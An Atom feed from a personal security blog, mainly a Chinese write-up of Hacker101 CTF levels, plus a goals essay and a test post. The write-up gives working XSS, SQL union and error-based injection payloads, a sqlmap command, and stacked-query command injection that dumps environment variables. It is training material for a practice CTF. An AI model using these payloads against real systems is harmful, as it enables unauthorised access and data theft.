<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Vulnner</title>
  
  
  <link href="https://vulnner.github.io/atom.xml" rel="self"/>
  
  <link href="https://vulnner.github.io/"/>
  <updated>2021-06-30T15:03:15.076Z</updated>
  <id>https://vulnner.github.io/</id>
  
  <author>
    <name>vulnner</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hacker101-CTF总结与反思-1</title>
    <link href="https://vulnner.github.io/2021/06/27/Hacker101-CTF%E6%80%BB%E7%BB%93%E4%B8%8E%E5%8F%8D%E6%80%9D-1/"/>
    <id>https://vulnner.github.io/2021/06/27/Hacker101-CTF%E6%80%BB%E7%BB%93%E4%B8%8E%E5%8F%8D%E6%80%9D-1/</id>
    <published>2021-06-27T08:01:27.000Z</published>
    <updated>2021-06-30T15:03:15.076Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><blockquote><p>本系列文章是对Hacker101 CTF的整理与反思。</p></blockquote><h3 id="1-A-little-something-to-get-you-started"><a href="#1-A-little-something-to-get-you-started" class="headerlink" title="1 A little something to get you started"></a>1 A little something to get you started</h3><ul><li>CTF Name: A little something to get you started</li><li>Resource：Hacker101 CTF</li><li>Difficulty: Trivial </li><li>Number of Flags: 1</li></ul><h4 id="1-1-Flag-0"><a href="#1-1-Flag-0" class="headerlink" title="1.1 Flag 0"></a>1.1 Flag 0</h4><blockquote><p> 思路：查看源码</p></blockquote><p>打开之后，只有一个如下的页面：</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210627160808737.png" alt="image-20210627160808737"></p><p>很自然的，想到去查看源代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css"><span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="css"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;background.png&quot;</span>);</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome to level 0.  Enjoy your stay.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>里面有一个背景图片的url，打开看一下，里面存放着flag。</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210627160940118.png" alt="image-20210627160940118"></p><h3 id="2-Micro-CMS-v1"><a href="#2-Micro-CMS-v1" class="headerlink" title="2 Micro-CMS v1"></a>2 Micro-CMS v1</h3><ul><li>CTF Name: Micro-CMS v1</li><li>Resource：Hacker101 CTF</li><li>Difficulty: Easy </li><li>Number of Flags: 4</li></ul><h4 id="2-1-Flag0"><a href="#2-1-Flag0" class="headerlink" title="2.1 Flag0"></a>2.1 Flag0</h4><blockquote><p>思路：使用每一个功能，观察对应的URL，认真阅读返回的报错信息。要重视Hint</p></blockquote><ul><li>Hint: Try creating a new page</li></ul><p>首先创建一个新页面，然后回到主界面，现在一共有三篇文章。点开每一篇文章，观察它们的URL，发现如下对应关系：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">article_1 --&gt; page/1</span><br><span class="line">article_2 --&gt; page/2</span><br><span class="line">articel_3 --&gt; page/11</span><br></pre></td></tr></table></figure><p>中间隔了一段数字，要么URL path的数字是随机的，要么就是<code>3-10</code>之间有什么问题。</p><p>再创建一篇文章，发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">article_4 --&gt; page/12</span><br></pre></td></tr></table></figure><p>那么，中间的这几个数字可能就有问题。</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210627162354190.png" alt="image-20210627162354190"></p><p>意思是没有权限，进行了读保护。</p><p>但是，这个简单的CMS有编辑页面的功能，既然有读保护，那么以写权限去查看呢？使用编辑页面的API查看<code>4</code></p><p>得到Flag：</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210627162601664.png" alt="image-20210627162601664"></p><h4 id="2-2-Flag1"><a href="#2-2-Flag1" class="headerlink" title="2.2 Flag1"></a>2.2 Flag1</h4><ul><li><p>Hint：</p><ul><li>Make sure you tamper with every input</li><li>Have you tested for the usual culprits? XSS, SQL injection, path injection</li><li>Bugs often occur when an input should always be one type and turns out to be another</li><li>Remember, form submissions aren’t the only inputs that come from browsers</li></ul></li><li><p>题解：</p><p>这个其实有点不太理解，在编辑页面，比较明显的input是表单，但URL某种程度上也算是一种input。尝试在<code>http://35.227.24.107/d3e03288bc/page/edit/11</code>后添加<code>&lt;, &#39;</code>，发现添加<code>&#39;</code>后得到Flag。</p><p>猜测可能是通过这个数字来进行文章内容的查询，单引号触发了SQL注入。也可能是hint的第三点，本来应该是数字类型，加上了单引号后使得类型改变了。（但是，只在编辑页面可以，查看页面不行。）</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210627164541093.png" alt="image-20210627164541093"></p></li><li><p>总结：多尝试一些特殊字符，比如<code>&#39;, &quot;, &lt;, &gt;</code>等</p></li></ul><h4 id="2-3-Flag2"><a href="#2-3-Flag2" class="headerlink" title="2.3 Flag2"></a>2.3 Flag2</h4><ul><li><p>Hint:</p><ul><li>Sometimes a given input will affect more than one page</li><li>The bug you are looking for doesn’t exist in the most obvious place this input is shown</li></ul></li><li><p>题解：</p><p>看Hint，说的是有时，一个给定的输入，可能会影响不止一个页面。再加上创建页面上有这么一句话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Markdown is supported, but scripts are not</span><br></pre></td></tr></table></figure><p>那么合理猜测，这次是和XSS有关。可能在当前页面下不会触发XSS，会在其他展示的页面触发。也可能都触发。创建如下页面，发现并没有触发XSS，但是回到主页面，弹出了Flag。</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210627164958040.png" alt="image-20210627164958040"></p></li><li><p>总结：用户输入造成的问题，可能不仅仅会影响当前页面。</p></li></ul><h4 id="2-4-Flag3"><a href="#2-4-Flag3" class="headerlink" title="2.4 Flag3"></a>2.4 Flag3</h4><ul><li><p>Hint：Script tags are great, but what other options do you have?</p></li><li><p>题解：</p><p>在创建页面时，在内容栏填写<code>&lt;img src=1 onerror=alert(2)&gt;</code>，然后发现弹框了，但是没有弹flag。这时候再次查看源码，发现Flag已经出现在了源码中。</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210627165432705.png" alt="image-20210627165432705"></p></li></ul><ul><li>总结：需要了解XSS的各个payload。</li></ul><h4 id="2-5-总结"><a href="#2-5-总结" class="headerlink" title="2.5 总结"></a>2.5 总结</h4><ul><li>首先要关注给出的Hint，这非常重要。</li><li>拿到一个站点之后，首先要先使用以下它的基本功能，观察源代码和URL，URL中的数字可能会比较重要。</li><li>存在用户输入的地方，可能会有XSS问题，XSS可能不仅在当前页面触发。</li><li>关注用户输入的位置，不仅是那些明显的表单；用户输入有时候会存在类型的bug。</li><li>关注<a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html">owasp下的XSS问题</a>。</li></ul><h3 id="3-Micro-CMS-v2"><a href="#3-Micro-CMS-v2" class="headerlink" title="3 Micro-CMS v2"></a>3 Micro-CMS v2</h3><ul><li>CTF Name: Micro-CMS v2</li><li>Resource：Hacker101 CTF</li><li>Difficulty: Moderate </li><li>Number of Flags: 3</li></ul><h4 id="3-1-Flag0"><a href="#3-1-Flag0" class="headerlink" title="3.1 Flag0"></a>3.1 Flag0</h4><ul><li><p>Hint：</p><ul><li>Regular users can only see public pages</li><li>Getting admin access might require a more perfect union</li><li>Knowing the password is cool, but there are other approaches that might be easier</li></ul></li><li><p>题解：</p><p>先观察这个系统，发现是在Micro-CMS v1的基础上，修复了一部分安全漏洞，并且增加了用户认证。只有admin才有权限去编辑页面。点击创建页面，发现将我们重定向到了登录页面。Hint中提到了<code>union</code>很自然的联想到sql注入联合查询。并且我们似乎不必知道密码即可登录。</p><p>那么先尝试一下，在表单中输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#x27;</span><br><span class="line">password: 123</span><br></pre></td></tr></table></figure><p>得到了如下报错。显然，存在SQL注入，观察报错语句，是根据username从admins表中查询密码。</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210627171734151.png" alt="image-20210627171734151"></p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210627171901025.png" alt="image-20210627171901025"></p><p>使用联合查询，使得查询到的password为111，发现登录成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#x27;union select &#x27;111&#x27; as password-- a</span><br><span class="line">password: 111</span><br></pre></td></tr></table></figure><p>查看private page，得到flag。</p></li><li><p>总结：</p><ul><li>登录框处，可能存在SQL注入。有时候登录不一定需要知道密码；联合查询很重要，可以操纵返回结果。</li><li>联合查询的妙用</li></ul></li></ul><h4 id="3-2-Flag1"><a href="#3-2-Flag1" class="headerlink" title="3.2 Flag1"></a>3.2 Flag1</h4><ul><li><p>Hint：</p><ul><li>What actions could you perform as a regular user on the last level, which you can’t now?</li><li>Just because request fails with one method doesn’t mean it will fail with a different method</li><li>Different requests often have different required authorization</li></ul></li><li><p>题解：</p><p>看Hint，大概是说作为普通用户的时候，直接在前端编辑页面时不行的。但是有时，一种请求方法会失败，另一种却不一定，不同的requests经常会有不同的权限。</p><p>在前端直接编辑页面时，使用的是GET方法，那么改成POST方法呢？</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210627172616394.png" alt="image-20210627172616394"></p><p>得到Flag。</p></li><li><p>总结：当通过GET方法发起http请求没有权限时，说不定POST有，反之亦然。有时不同的请求方法，具有不同的权限校验。</p></li></ul><h4 id="2-3-Flag2-1"><a href="#2-3-Flag2-1" class="headerlink" title="2.3 Flag2"></a>2.3 Flag2</h4><ul><li><p>Hint：Credentials are secret, flags are secret. Coincidence?</p></li><li><p>题解：</p><p>还是看Hint，大概是说Flag和登陆凭证有关系，可能需要我们通过SQL注入注出表中的数据然后登录。</p><p>由于返回的报错信息，我们可以使用报错注入。</p><p>报错注入大概的payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 获取当前用户名</span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1, concat(0x7e, user())) or &#x27;</span></span><br><span class="line"># 获取数据库名</span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1, concat(0x7e, database())) or &#x27;</span></span><br><span class="line"># 获取表名</span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1, concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp &#x27;</span>level2<span class="string">&#x27;))) or &#x27;</span></span><br><span class="line"># 获取列名</span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name regexp &#x27;</span>admins<span class="string">&#x27;))) or &#x27;</span></span><br><span class="line"># 获取数据</span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1, concat(0x7e,(select username from admins))) or &#x27;</span></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1, concat(0x7e,(select password from admins))) or &#x27;</span></span><br></pre></td></tr></table></figure><p>注出用户名和密码后，登录即得到flag。</p></li><li><p>总结：SQL报错注入的利用。</p></li></ul><h4 id="3-4-总结"><a href="#3-4-总结" class="headerlink" title="3.4 总结"></a>3.4 总结</h4><ul><li>登录处，可能存在SQL注入。联合查询有妙用，不一定需要知道密码。</li><li>不同方法的HTTP请求，权限校验可能不同。GET没权限时，可以试试POST等。</li><li>SQL报错注入，注出表中数据。 </li></ul><h3 id="4-Encrypted-Pastebin"><a href="#4-Encrypted-Pastebin" class="headerlink" title="4 Encrypted Pastebin"></a>4 Encrypted Pastebin</h3><h3 id="5-Photo-Gallery"><a href="#5-Photo-Gallery" class="headerlink" title="5 Photo Gallery"></a>5 Photo Gallery</h3><ul><li>CTF Name: Photo Gallery</li><li>Resource：Hacker101 CTF</li><li>Difficulty: Moderate </li><li>Number of Flags: 3</li></ul><blockquote><p>思路：</p></blockquote><h4 id="5-1-Flag0"><a href="#5-1-Flag0" class="headerlink" title="5.1 Flag0"></a>5.1 Flag0</h4><ul><li><p>Hint：</p><ul><li>Consider how you might build this system yourself. What would the query for fetch look like?</li><li>Take a few minutes to consider the state of the union</li><li>This application runs on the uwsgi-nginx-flask-docker image</li></ul></li><li><p>题解</p><p>看了一下网页，只有几幅图和文字。首先，还是查看网页源码，发现图片是通过<code>&lt;img src=&quot;[fetch?id=1](http://35.190.155.168/ebd309c18c/fetch?id=1)&quot;&gt;</code>访问的，点开这个连接，即可访问到图片。</p><p>根据提示，如果我自己实现这个系统，我会如何查询。</p><p>大胆推测一下，访问<code>/fetch</code>API，会触发一定的逻辑：</p><p>从用户输入获取id，然后从数据库中根据id查询到图片对应的名字，之后根据path+filename返回图片内容。</p><p>既然涉及到了数据库查询，可能就存在SQL注入，测试了一下果真存在。但问题在于如何进一步利用呢？</p><p>根据提示，可能用到联合查询。但用union查询什么内容呢？</p><p>再结合第三点提示，应用运行在<code>uwsgi-nginx-flask-docker</code>镜像中，google一下，大概知道工业界经常把uwsgi和Nginx结合在一起当做服务器使用。</p><p>再看了其他的writeup，说是要查看配置文件<code>uwsgi.ini</code>，不过我还是不太明白为什么要看它。</p><p>访问<code>fetch?id=4%20union%20select%20%27uwsgi.ini%27</code>，得到如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi] module = main callable = app</span><br></pre></td></tr></table></figure><p>可知，文件名应该是main。</p><p>访问<code>fetch?id=4 UNION SELECT ‘main.py’ </code>，得到如下内容（部分代码和flag）：</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210630214456702.png" alt="image-20210630214456702"></p></li><li><p>总结</p><ul><li>针对某些功能，大胆猜测业务的实现逻辑</li><li>联合查询的巧妙使用</li><li>读取uwsgi.ini？？？？？</li></ul></li></ul><h4 id="5-2-Flag-1-amp-amp-2"><a href="#5-2-Flag-1-amp-amp-2" class="headerlink" title="5.2 Flag 1&amp;&amp;2"></a>5.2 Flag 1&amp;&amp;2</h4><p>flag1按照提示，应该是尝试尝试SQL注入，注出photos表中的数据即可。但是表里的数据没加Flag，我一开始不知道那就是。只需要用sqlmap跑一遍就行。只有命令有一些小技巧大概的说一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> --code 200表示：当query是<span class="literal">true</span>的时候，http对应的code</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这样查询会快一点，不然time-blind会浪费很多时间</span></span><br><span class="line">sqlmap -u &quot;http://35.190.155.168/73f5aeb9ff/fetch?id=1&quot; --method GET --dump -D level5 -T photos -p id --code 200 --skip-waf --random-agent --threads 10 -o</span><br></pre></td></tr></table></figure><p>Flag2会直接得到三个Flag，所以这里直接说Flag2好了。</p><ul><li><p>Hint：</p><ul><li>That method of finding the size of an album seems suspicious</li><li>Stacked queries rarely work. But when they do, make absolutely sure that you’re committed</li><li>Be aware of your environment</li></ul></li><li><p>题解：</p><p>阅读以下<code>main.py</code>中的源码，发现有一点值得注意。</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210630215405034.png" alt="image-20210630215405034"></p><p>红色的部分，有RCE的风险，它调用了执行命令的函数，并且拼接了fn。fn是什么，自习阅读源码，发现fn其实就是photos表中的filename字段。但是filename字段是在表中写死的，我们怎么改？</p><p>结合提示，可以利用stacked query。</p><p><code>fetch?id=4;update photos set filename=&#39;|| ls &gt; test.txt&#39; where id = 3; commit--</code> </p><blockquote><p>注意，execute执行增删改操作时，需要commit进行提交。</p><p>疑问：<code>cur.execute(&#39;SELECT filename FROM photos WHERE id=%s&#39; % request.args[&#39;id&#39;])</code></p><p>这写法能造成堆叠注入？不得这么写吗？</p><p><code>cursor.execute(&quot;;&quot;.join(queries), data, multi=True)</code></p></blockquote><p>然后查看test.txt发现成功看到了内容：</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210630220548403.png" alt="image-20210630220548403"></p><p>但是flag在哪里呢？再次结合提示，<em>Be aware of your environment</em>，可能在环境变量里。</p><p><code>fetch?id=4;update photos set filename=&#39;|| env &gt; test.txt&#39; where id = 3; commit--</code></p><p>再利用联合查询查看test.txt的内容，得到三个Flag。</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210630220935945.png" alt="image-20210630220935945"></p></li><li><p>总结</p><ul><li>认真阅读源码，关注提示，注意环境变量env</li><li>代码执行的灵活运用</li><li>代码执行和联合查询的结合</li></ul></li></ul><h4 id="5-3-总结"><a href="#5-3-总结" class="headerlink" title="5.3 总结"></a>5.3 总结</h4><ul><li>猜测业务功能的可能实现逻辑，不要想一半，要完全想清楚，覆盖整个流程</li><li>注意联合查询</li><li>sqlmap的使用技巧</li><li>RCE、stacked queries、联合查询、环境变量的结合</li></ul><h3 id="6-Cody’s-First-Blog"><a href="#6-Cody’s-First-Blog" class="headerlink" title="6 Cody’s First Blog"></a>6 Cody’s First Blog</h3><ul><li>CTF Name: Cody’s First Blog</li><li>Resource：Hacker101 CTF</li><li>Difficulty: Moderate </li><li>Number of Flags: 3</li></ul><blockquote><p>思路：</p></blockquote><h4 id="6-1-Flag0"><a href="#6-1-Flag0" class="headerlink" title="6.1 Flag0"></a>6.1 Flag0</h4><ul><li><p>Hint</p><ul><li>What was the first input you saw?</li><li>Figuring out what platform this is running on may give you some ideas</li><li>Code injection usually doesn’t work</li></ul></li><li><p>题解</p><p>观察网站的内容、URL和源码，再结合Hint。</p><p>第一眼看到的input，自然是表格的输入框。而这个应用运行的平台，通过插件发现是ubuntu+PHP。第三点提示很重要，提到了code注入。</p><p>第一反应是XSS，输入最基本的payload<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现并没有什么卵用，在目前仅有的两个页面也没有处罚。</p><p>那么，如果注入PHP Code呢？尝试一下输入<code>&lt;?php echo &#39;hello&#39; ?&gt;</code>，提交，得到Flag。</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210630224039848.png" alt="image-20210630224039848"></p></li><li><p>总结</p><ul><li>提示很重要，根据提示来思考。</li><li>问题：后台怎么写的代码？只要输入了PHP CODE就给出flag吗？</li></ul></li></ul><h4 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h4><ul><li><p>Hint</p><ul><li>Make sure you check everything you’re provided</li><li>Unused code can often lead to information you wouldn’t otherwise get</li><li>Simple guessing might help you out</li></ul></li><li><p>题解</p><p>在观察网站的时候，查看源码，发现有一段被注释的代码<code>&lt;!--&lt;a href=&quot;?page=admin.auth.inc&quot;&gt;Admin login&lt;/a&gt;--&gt;</code>，泄露了网站路径，访问发现是一个admin login页面。</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210630224400928.png" alt="image-20210630224400928"></p><p>马上想到了SQL注入，但此处貌似不存在注入，联合查询也没得用。再看提示，说Simple guessing might help you out。</p><p>随便输入一个<code>?page=a</code>，得到如下结果</p><p><img src="/.io//blogs\vulnner\source_posts\assets\image-20210630224642703.png" alt="image-20210630224642703"></p><p>所以，<code>?page=admin.auth.inc</code>应该就是<code>include(admin.auth.inc.php)</code></p><p>推测，有三个PHP文件：<code>admin.php</code>, <code>auth.php</code>和<code>inc.php</code>。</p><p>尝试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?page=admin</span><br><span class="line">?page=auth</span><br><span class="line">?page=inc</span><br><span class="line">?page=admin.auth</span><br><span class="line">?page=admin.inc   # success</span><br><span class="line">?page=auth.inc</span><br></pre></td></tr></table></figure><p>访问<code>?page=admin.inc</code>页面，得到flag。</p></li><li><p>总结</p><ul><li>查看网页源码；注释很重要，其中可能会泄露一些敏感信息</li><li>大胆的猜测；PHP的文件包含，文件名的猜解。</li></ul></li></ul><h4 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h4><ul><li><p>Hint</p><ul><li>Read the first blog post carefully</li><li>We talk about this in the Hacker101 File Inclusion Bugs video</li><li>Where can you access your own stored data?</li><li>Include doesn’t just work for filenames</li></ul></li><li><p>题解</p></li><li><p>总结</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本系列文章是对Hacker101 CTF的整理与反思。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;1-A-little-something-to-get-you-started&quot;&gt;&lt;a href=&quot;#1-A-li</summary>
      
    
    
    
    <category term="Hacker101" scheme="https://vulnner.github.io/categories/Hacker101/"/>
    
    
    <category term="CTF" scheme="https://vulnner.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2021展望</title>
    <link href="https://vulnner.github.io/2021/01/04/2021%E5%B1%95%E6%9C%9B/"/>
    <id>https://vulnner.github.io/2021/01/04/2021%E5%B1%95%E6%9C%9B/</id>
    <published>2021-01-04T13:49:58.000Z</published>
    <updated>2021-01-05T14:07:01.787Z</updated>
    
    <content type="html"><![CDATA[<p>2020已经结束，2021刚刚到来，回顾2020，我是否完成或达到了我最初的目标呢？答案显然是否定的，需要反思。</p><p>来问一个问题，2021，我想达到什么目标，或者掌握什么技能呢？</p><blockquote><p> 一个总的目标：掌握我一直以来在找寻的本质和界限。</p><p>目标：</p><ul><li>二进制完成入门+一定程度的精通；</li><li>学完并掌握汇编和OS。</li><li>工作中Web安全的不断巩固和拓展</li></ul></blockquote><p>在安全上，大概有以下几个方向：</p><ul><li><p>web方向</p><p>web方向可以说是大部分的入门方向，我对web的理解足够吗？显然是不够的，我对一些最本质的东西还缺乏了解，对JS的掌握显然也不够，但是目前我没有去学习js的打算。</p></li><li><p>二进制方面：逆向、pwn、缓冲区溢出等漏洞</p><p>在这方面，首先，需要看b站的视频，边看边实践+理解，过程中可能会遇到一些问题，首先需要查阅资料搞懂一段汇编代码，将它和c程序、内存关联起来。先来列一下步骤：</p><p>step1. 看b站的视频，认真理解+记录，看完一个后总结，搜索感到疑惑的地方。</p><p>step2. b站视频刷完后，整体回顾，总结写成博客，完成基本漏洞的了解。</p><p>step3. 去刷xctf上的题目，进行巩固，practice makes perfect。</p><p>step3. 去看看雪上二进制方面的精华帖，不断思考，实践并写博客。</p></li></ul><p>而在基础课程上，我应该还需要学习汇编语言、操作系统、编译原理、计算机网络这些基础课程。但是想学的太多，没想好要怎么分配，并且如果要学这些的话，需要大量的时间和精力投入，所以先来定一下目标，等到上一个目标完成后，再来践行这个。</p><p>希望我可以自信地说”我在安全领域已经有有那么一点成就了”。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2020已经结束，2021刚刚到来，回顾2020，我是否完成或达到了我最初的目标呢？答案显然是否定的，需要反思。&lt;/p&gt;
&lt;p&gt;来问一个问题，2021，我想达到什么目标，或者掌握什么技能呢？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; 一个总的目标：掌握我一直以来在找寻的本质</summary>
      
    
    
    
    <category term="随笔" scheme="https://vulnner.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="https://vulnner.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>test_article</title>
    <link href="https://vulnner.github.io/2020/04/05/test-article/"/>
    <id>https://vulnner.github.io/2020/04/05/test-article/</id>
    <published>2020-04-05T03:24:11.000Z</published>
    <updated>2020-04-05T03:32:38.328Z</updated>
    
    <content type="html"><![CDATA[<p>This is a test article.</p><p><strong>Python Code</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Python123DemoItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><strong>Golang Code</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    str := <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">    fmt.Println(str)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Java Code</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>C Code</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>C++ Code</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Hello, world&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;This is a test article.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Python Code&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span</summary>
      
    
    
    
    <category term="test" scheme="https://vulnner.github.io/categories/test/"/>
    
    
    <category term="test" scheme="https://vulnner.github.io/tags/test/"/>
    
  </entry>
  
